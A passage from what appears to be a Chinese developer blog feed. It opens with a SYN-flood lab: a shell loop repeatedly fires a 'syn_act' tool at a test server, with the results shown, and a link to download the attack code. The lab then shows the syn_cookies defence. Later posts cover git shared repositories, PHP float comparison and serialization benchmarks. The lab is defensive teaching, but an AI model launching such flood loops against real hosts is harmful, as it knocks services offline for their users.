<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/bin/sh</span>
</span><span class='line'>
</span><span class='line'><span class="c">#目标服务器ip地址</span>
</span><span class='line'><span class="nv">ip</span><span class="o">=</span><span class="s2">&quot;172.16.5.69&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">while</span> <span class="o">[</span> <span class="s2">&quot;1&quot;</span> <span class="o">=</span> <span class="s2">&quot;1&quot;</span> <span class="o">]</span>;
</span><span class='line'><span class="k">do</span>
</span><span class='line'><span class="k">    </span>sudo ./syn_act <span class="nv">$ip</span>
</span><span class='line'><span class="k">done</span>
</span></code></pre></td></tr></table></div></figure>


<p>运行攻击</p>

<p><code>./run.sh</code></p>

<p>查看服务器的tcp状态,发现 SYN_RECV 数值很高</p>

<pre><code>SYN_RECV 1537
ESTABLISHED 6
</code></pre>

<p>在另外一台机器上 curl 请求测试服务器的nginx,显示无法连接服务器。</p>

<pre><code>$time curl http://172.16.5.69/index.html
curl: (7) couldn't connect to host

real    0m14.149s
user    0m0.004s
sys     0m0.004s
</code></pre>

<h3>服务端防御</h3>

<h4>终于说到我们做这个实验的目的了，内牛满面啊</h4>

<p>解决方案有很多，这里介绍一种方案：</p>

<p><code>syn_cookie</code>，你可以在<a href="http://www.ibm.com/developerworks/cn/linux/l-syncookie/">这里</a>学习到<code>syn_cookie</code>的工作原理。</p>

<h4>开启 <code>syn_cookie</code></h4>

<p>修改<code>/etc/sysctl.conf</code>文件，添加参数</p>

<pre><code>net.ipv4.tcp_syncookies = 1
</code></pre>

<p>运行下面命令，让配置文件生效</p>

<pre><code>sudo sysctl -p
</code></pre>

<p>运行 syn_act 攻击测试服务器,查看服务器的tcp状态,发现 SYN_RECV 数值依旧很高</p>

<pre><code>SYN_RECV 1537
ESTABLISHED 6
</code></pre>

<p>但是，这一次在另外一台机器上用 curl 请求测试服务器，nginx表示毫无鸭梨，立即就返回了结果</p>

<pre><code>$time curl http://172.16.5.69/index.html
hello

real    0m0.082s
user    0m0.004s
sys     0m0.003s
</code></pre>

<p>注：<code>syn_cookie</code> 在大部分linux系统下默认是开启的，你可以通过 <code>sysclt -a|grep tcp_syncookies</code> 查看下是否已经开启 :)</p>

<p>总结: <code>syn flood doc</code> 是比较老的攻击手段，目前已经有很多很好的解决方案提供支持，
甚至大部分linux系统默认设置就能抵挡一定量的攻击,小伙伴们尽可放心的使用你们的linux服务器把 :)</p>

<p>最后，把上面的代码打包下, 方便做实验的小伙伴们，点击<a href="http://sunkid.me/download/syn_act.zip">这里</a>就可以下载到哦。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[GIT SSH的权限问题]]></title>
    <link href="http://sunkid.me/blog/2012/11/06/permission-for-git-ssh/"/>
    <updated>2012-11-06T14:09:00+08:00</updated>
    <id>http://sunkid.me/blog/2012/11/06/permission-for-git-ssh</id>
    <content type="html"><![CDATA[<p>公司内部服务器部署git的话，通常会采用ssh的连接方式，部署方便，控制也容易。</p>

<p>今天，我们说说用ssh要注意的用户权限设置问题。</p>

<p>我们先建立一个ios组</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>groupadd ios</span></code></pre></td></tr></table></div></figure>


<p>给每个ios的工程师创建用户</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>useradd -g ios -G ios username</span></code></pre></td></tr></table></div></figure>


<p>创建你的git仓库</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>git init --bare --shared</span></code></pre></td></tr></table></div></figure>


<p>这里的&#8211;shared参数非常重要，它表示git文件的组用户有可写权限。
楼主就有次忘记了加这个参数，结果导致工程师A提交的文件，工程师B
可以查看到但无法修改提交。</p>

<p>当然，如果你已经创建好git仓库后发现忘记加 &#8211;shared 参数。
你也可以直接修改config文件,在core下添加这一句</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[core]
</span><span class='line'>    sharedrepository = 1</span></code></pre></td></tr></table></div></figure>


<p>git的配置是不是也很简单呢 XD</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[为什么Double不能直接比较]]></title>
    <link href="http://sunkid.me/blog/2012/06/26/why-can-not-compare-the-double/"/>
    <updated>2012-06-26T00:58:00+08:00</updated>
    <id>http://sunkid.me/blog/2012/06/26/why-can-not-compare-the-double</id>
    <content type="html"><![CDATA[<p>今天在微薄看到这样的一个PHP的问题：</p>

<pre><code>对@Laruence 说：一个怪现象，从数据库中读取的浮点型数据，并代码中floatval了，和php中的floatval数值比较，
var_dump输出的两个值均为float(8.87)，明明是相同的，结果却给出了不相等的答案。
</code></pre>

<p>又勾起之前的学c的知识，无奈好久没碰，渐渐生疏了。。担心日久真全忘了，只好烂烂笔头，写写博客，记录点东西下来。</p>

<!-- more -->


<p>分析这个php的问题，我们先的从php的类型分析起，php是弱类型，关于php类型的内部结构，可以看<a href="http://www.laruence.com/2011/12/19/2399.html">这里</a></p>

<p>现在，我们知道了php中的float类型是用c的double类型保存的。我们还得知道double类型在内存中是怎么表示的。</p>

<p>浮点类型在内存中表示方式一般采用IEEE浮点规定( V = (-1)<sup>s</sup> x M x 2<sup>e</sup> )：</p>

<pre><code>*   符号(sign) s决定数是负数还是正数
*   有效数(significand) M是一个二进制小数
*   指数(exponent) E是2的幂
</code></pre>

<p>浮点数的位表示被划分为三个域，以编码这些值：</p>

<pre><code>*   一个单独的符号位s直接编码符号s
*   k位的指数域,编码指数E
*   n位小数域,编码有效数M,但被编码的值也依赖于指数域的值是否等于零
</code></pre>

<p>在C语言的double中，s，exp和frac域分别为1位，11位和52位，产生一个64位的表示.</p>

<p><img src="http://sunkid.me/images/post/IEEE_Double.bmp" width="600" height="800"></p>

<p>了解了double在内存中的存储方式后，我们再看下 M 是如何用二进制保存小数的。</p>

<p>我们首先先看下熟悉的十进制表示法,表达式描述的数d定义如下：</p>

<p><img src="http://sunkid.me/images/post/wd1.png"></p>

<p>类似的，十进制与二进制区别是单位取值范围0～9与0～1的不同，二进制的表达式描述的数b定义如下：</p>

<p><img src="http://sunkid.me/images/post/wd2.png"></p>

<p>假定我们仅考虑有限长度的编码，那么十进制符号是不能准确表达像1/3,3/5这样的数，
类似的，小数的二进制表示法只能表示那些能够被写成 x * 2<sup>y</sup> 的数。
其他的值只能近似地表达</p>

<p><strong>所以，这使得double在内存中只能保存近似值，以至于double的值不能直接进行等号比较</strong></p>

<p>下面，我们看看这样一个例子，实例来说明php中double是不能直接等号比较的 ：）</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'>  <span class="nv">$a</span> <span class="o">=</span> <span class="mf">2.2</span><span class="p">;</span>
</span><span class='line'>  <span class="nv">$d</span> <span class="o">=</span> <span class="mf">0.3</span> <span class="o">+</span> <span class="mf">1.9</span><span class="p">;</span>
</span><span class='line'>  <span class="nb">var_dump</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span><span class='line'>  <span class="nb">var_dump</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
</span><span class='line'>  <span class="c1">//错误示例，double不能直接用等号比较</span>
</span><span class='line'>  <span class="nb">var_dump</span><span class="p">(</span><span class="nv">$a</span> <span class="o">==</span> <span class="nv">$d</span><span class="p">);</span>
</span><span class='line'>  <span class="c1">//double类型常用的比较方法</span>
</span><span class='line'>  <span class="c1">//0.000001是个阀值</span>
</span><span class='line'>  <span class="nb">var_dump</span><span class="p">(</span><span class="nb">abs</span><span class="p">(</span><span class="nv">$a</span> <span class="o">-</span> <span class="nv">$d</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mf">0.000001</span><span class="p">);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>输出的结果:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>float<span class="o">(</span>2.2<span class="o">)</span>
</span><span class='line'>float<span class="o">(</span>2.2<span class="o">)</span>
</span><span class='line'>bool<span class="o">(</span><span class="nb">false</span><span class="o">)</span>
</span><span class='line'>bool<span class="o">(</span><span class="nb">true</span><span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>最后，可能有人会问上面比较式的阀值取多小为宜呢？ 这个值的选取我们可以根据IEEE公式中
的M的位数得到一条这样的公式：</p>

<pre><code>阀值 &gt;= 2^(k - M);
</code></pre>

<p>由于浮点的运算还会带来部分的精度损失，所以建议 k > 2， 当然，如果你的项目对浮点的精度
要求不是很严格，那你也可以像我直接选用0.000001这样的值来使用。 ：）</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[php 序列化的几种方法比较]]></title>
    <link href="http://sunkid.me/blog/2012/05/28/php-efficiency-of-serialize/"/>
    <updated>2012-05-28T22:08:00+08:00</updated>
    <id>http://sunkid.me/blog/2012/05/28/php-efficiency-of-serialize</id>
    <content type="html"><![CDATA[<p>最近看Thinkphp源码，看到里面的F函数，用var_export方法对数组进行序列化保存到文本来做缓存。
这是头次见到的，有点疑惑是否TP的这种方法会不会快点呢？于是有了下面的几个小测试</p>

<!--more-->


<p>首先测试ThinkPHP的var_export对序列化和反序列化的效率</p>

<figure class='code'><figcaption><span>ThinkPhp</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'><span class="c1">// 去除代码中的空白和注释</span>
</span><span class='line'><span class="c1">//ThinkPhp 的函数</span>
</span><span class='line'><span class="k">function</span> <span class="nf">strip_whitespace</span><span class="p">(</span><span class="nv">$content</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$stripStr</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'>    <span class="c1">//分析php源码</span>
</span><span class='line'>    <span class="nv">$tokens</span> <span class="o">=</span> <span class="nb">token_get_all</span><span class="p">(</span><span class="nv">$content</span><span class="p">);</span>
</span><span class='line'>    <span class="nv">$last_space</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$j</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$tokens</span><span class="p">);</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$j</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$tokens</span><span class="p">[</span><span class="nv">$i</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>            <span class="nv">$last_space</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span><span class='line'>            <span class="nv">$stripStr</span> <span class="o">.=</span> <span class="nv">$tokens</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
</span><span class='line'>        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>            <span class="k">switch</span> <span class="p">(</span><span class="nv">$tokens</span><span class="p">[</span><span class="nv">$i</span><span class="p">][</span><span class="mi">0</span><span class="p">])</span> <span class="p">{</span>
</span><span class='line'>                <span class="c1">//过滤各种PHP注释</span>
</span><span class='line'>                <span class="k">case</span> <span class="nx">T_COMMENT</span><span class="o">:</span>
</span><span class='line'>                <span class="k">case</span> <span class="nx">T_DOC_COMMENT</span><span class="o">:</span>
</span><span class='line'>                    <span class="k">break</span><span class="p">;</span>
</span><span class='line'>                <span class="c1">//过滤空格</span>
</span><span class='line'>                <span class="k">case</span> <span class="nx">T_WHITESPACE</span><span class="o">:</span>
</span><span class='line'>                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$last_space</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                        <span class="nv">$stripStr</span> <span class="o">.=</span> <span class="s1">&#39; &#39;</span><span class="p">;</span>
</span><span class='line'>                        <span class="nv">$last_space</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span><span class='line'>                    <span class="p">}</span>
</span><span class='line'>                    <span class="k">break</span><span class="p">;</span>
</span><span class='line'>                <span class="k">case</span> <span class="nx">T_START_HEREDOC</span><span class="o">:</span>
</span><span class='line'>                    <span class="nv">$stripStr</span> <span class="o">.=</span> <span class="s2">&quot;&lt;&lt;&lt;THINK</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>                    <span class="k">break</span><span class="p">;</span>
</span><span class='line'>                <span class="k">case</span> <span class="nx">T_END_HEREDOC</span><span class="o">:</span>
</span><span class='line'>                    <span class="nv">$stripStr</span> <span class="o">.=</span> <span class="s2">&quot;THINK;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>                    <span class="k">for</span> <span class="p">(</span><span class="nv">$k</span> <span class="o">=</span> <span class="nv">$i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="nv">$k</span> <span class="o">&lt;</span> <span class="nv">$j</span><span class="p">;</span> <span class="nv">$k</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                        <span class="k">if</span> <span class="p">(</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$tokens</span><span class="p">[</span><span class="nv">$k</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$tokens</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;;&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                            <span class="nv">$i</span> <span class="o">=</span> <span class="nv">$k</span><span class="p">;</span>
</span><span class='line'>                            <span class="k">break</span><span class="p">;</span>
</span><span class='line'>                        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$tokens</span><span class="p">[</span><span class="nv">$k</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="nx">T_CLOSE_TAG</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                            <span class="k">break</span><span class="p">;</span>
</span><span class='line'>                        <span class="p">}</span>
</span><span class='line'>                    <span class="p">}</span>
</span><span class='line'>                    <span class="k">break</span><span class="p">;</span>
</span><span class='line'>                <span class="k">default</span><span class="o">:</span>
</span><span class='line'>                    <span class="nv">$last_space</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span><span class='line'>                    <span class="nv">$stripStr</span> <span class="o">.=</span> <span class="nv">$tokens</span><span class="p">[</span><span class="nv">$i</span><span class="p">][</span><span class="mi">1</span><span class="p">];</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="nv">$stripStr</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">//创建数组函数</span>
</span><span class='line'><span class="k">function</span> <span class="nf">createArray</span><span class="p">(</span><span class="nv">$i</span><span class="p">){</span>
</span><span class='line'>  <span class="nv">$array</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="nv">$k</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$k</span><span class="o">&lt;</span><span class="nv">$i</span><span class="p">;</span><span class="nv">$k</span><span class="o">++</span><span class="p">){</span>
</span><span class='line'>      <span class="nv">$array</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$k</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">return</span> <span class="nv">$array</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$data</span> <span class="o">=</span> <span class="nx">createArray</span><span class="p">(</span><span class="mi">10000</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$start</span> <span class="o">=</span> <span class="nb">microtime</span><span class="p">(</span><span class="k">TRUE</span><span class="p">);</span>
</span><span class='line'><span class="nv">$sdata</span> <span class="o">=</span> <span class="nb">var_export</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
</span><span class='line'><span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">&quot;tp.php&quot;</span><span class="p">,</span> <span class="nx">strip_whitespace</span><span class="p">(</span><span class="s2">&quot;&lt;?php</span><span class="se">\n</span><span class="s2">return &quot;</span> <span class="o">.</span> <span class="nv">$sdata</span> <span class="o">.</span> <span class="s2">&quot;;</span><span class="se">\n</span><span class="s2">?&gt;&quot;</span><span class="p">));</span>
</span><span class='line'><span class="nv">$end</span> <span class="o">=</span> <span class="nb">microtime</span><span class="p">(</span><span class="k">TRUE</span><span class="p">);</span>
</span><span class='line'><span class="k">echo</span> <span class="s2">&quot;serialize time:&quot;</span><span class="p">;</span>
</span><span class='line'><span class="k">echo</span> <span class="nv">$end</span> <span class="o">-</span> <span class="nv">$start</span><span class="p">;</span>
</span><span class='line'><span class="k">echo</span> <span class="s2">&quot;(s), &quot;</span><span class="p">;</span>
</span><span class='line'><span class="k">echo</span> <span class="s2">&quot;serialize longth:&quot;</span><span class="o">.</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$sdata</span><span class="p">);</span>
</span><span class='line'><span class="k">echo</span> <span class="s2">&quot;&lt;br/&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$start</span> <span class="o">=</span> <span class="nb">microtime</span><span class="p">(</span><span class="k">TRUE</span><span class="p">);</span>
</span><span class='line'><span class="nv">$data</span> <span class="o">=</span> <span class="k">include</span> <span class="s2">&quot;tp.php&quot;</span><span class="p">;</span><span class="c1">//反序列号</span>
</span><span class='line'><span class="nv">$end</span> <span class="o">=</span> <span class="nb">microtime</span><span class="p">(</span><span class="k">TRUE</span><span class="p">);</span>
</span><span class='line'><span class="k">echo</span> <span class="s2">&quot;unserialize time:&quot;</span><span class="p">;</span>
</span><span class='line'><span class="k">echo</span> <span class="nv">$end</span> <span class="o">-</span> <span class="nv">$start</span><span class="p">;</span>
</span><span class='line'><span class="k">echo</span> <span class="s2">&quot;(s)&quot;</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>serialize <span class="nb">time</span>:0.18270683288574<span class="o">(</span>s<span class="o">)</span>, serialize longth:157789
</span><span class='line'>unserialize <span class="nb">time</span>:0.0076150894165039<span class="o">(</span>s<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>由于上面的方法要把数据写入文件，所以为了做比较，下面的序列化和反序列化也都写到文件后再读出来，
接着，测试的是传统serialize函数</p>

<figure class='code'><figcaption><span>serialize</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'><span class="k">function</span> <span class="nf">createArray</span><span class="p">(</span><span class="nv">$i</span><span class="p">){</span>
</span><span class='line'>  <span class="nv">$array</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="nv">$k</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$k</span><span class="o">&lt;</span><span class="nv">$i</span><span class="p">;</span><span class="nv">$k</span><span class="o">++</span><span class="p">){</span>
</span><span class='line'>      <span class="nv">$array</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$k</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">return</span> <span class="nv">$array</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$data</span> <span class="o">=</span> <span class="nx">createArray</span><span class="p">(</span><span class="mi">10000</span><span class="p">);</span>
</span><span class='line'><span class="nv">$start</span> <span class="o">=</span> <span class="nb">microtime</span><span class="p">(</span><span class="k">TRUE</span><span class="p">);</span>
</span><span class='line'><span class="nv">$sdata</span> <span class="o">=</span>  <span class="nb">serialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span> <span class="c1">//序列化</span>
</span><span class='line'><span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">&quot;se.php&quot;</span><span class="p">,</span> <span class="nv">$sdata</span><span class="p">);</span>
</span><span class='line'><span class="nv">$end</span> <span class="o">=</span> <span class="nb">microtime</span><span class="p">(</span><span class="k">TRUE</span><span class="p">);</span>
</span><span class='line'><span class="k">echo</span> <span class="s2">&quot;sertialize time:&quot;</span><span class="p">;</span>
</span><span class='line'><span class="k">echo</span> <span class="nv">$end</span> <span class="o">-</span> <span class="nv">$start</span><span class="p">;</span>
</span><span class='line'><span class="k">echo</span> <span class="s2">&quot;(s), &quot;</span><span class="p">;</span>
</span><span class='line'><span class="k">echo</span> <span class="s2">&quot;sertialize longth:&quot;</span><span class="o">.</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$sdata</span><span class="p">);</span>
</span><span class='line'><span class="k">echo</span> <span class="s2">&quot;&lt;br/&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$start</span> <span class="o">=</span> <span class="nb">microtime</span><span class="p">(</span><span class="k">TRUE</span><span class="p">);</span>
</span><span class='line'><span class="nv">$rdata</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">&quot;se.php&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nv">$data</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$rdata</span><span class="p">);</span> <span class="c1">//反序列化</span>
</span><span class='line'><span class="nv">$end</span> <span class="o">=</span> <span class="nb">microtime</span><span class="p">(</span><span class="k">TRUE</span><span class="p">);</span>
</span><span class='line'><span class="k">echo</span> <span class="s2">&quot;unserialize time:&quot;</span><span class="p">;</span>
</span><span class='line'><span class="k">echo</span> <span class="nv">$end</span> <span class="o">-</span> <span class="nv">$start</span><span class="p">;</span>
</span><span class='line'><span class="k">echo</span> <span class="s2">&quot;(s)&quot;</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>sertialize <span class="nb">time</span>:0.0031681060791016<span class="o">(</span>s<span class="o">)</span>, sertialize longth:137790
</span><span class='line'>unserialize <span class="nb">time</span>:0.0037140846252441<span class="o">(</span>s<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>再看看用json做序列化的效果</p>

<figure class='code'><figcaption><span>json</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'><span class="k">function</span> <span class="nf">createArray</span><span class="p">(</span><span class="nv">$i</span><span class="p">){</span>
</span><span class='line'>  <span class="nv">$array</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="nv">$k</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$k</span><span class="o">&lt;</span><span class="nv">$i</span><span class="p">;</span><span class="nv">$k</span><span class="o">++</span><span class="p">){</span>
</span><span class='line'>      <span class="nv">$array</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$k</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">return</span> <span class="nv">$array</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$data</span> <span class="o">=</span> <span class="nx">createArray</span><span class="p">(</span><span class="mi">10000</span><span class="p">);</span>
</span><span class='line'><span class="nv">$start</span> <span class="o">=</span> <span class="nb">microtime</span><span class="p">(</span><span class="k">TRUE</span><span class="p">);</span>
</span><span class='line'><span class="nv">$sdata</span> <span class="o">=</span>  <span class="nx">json_encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>  <span class="c1">//序列化</span>
</span><span class='line'><span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">&quot;js.php&quot;</span><span class="p">,</span> <span class="nv">$sdata</span><span class="p">);</span>
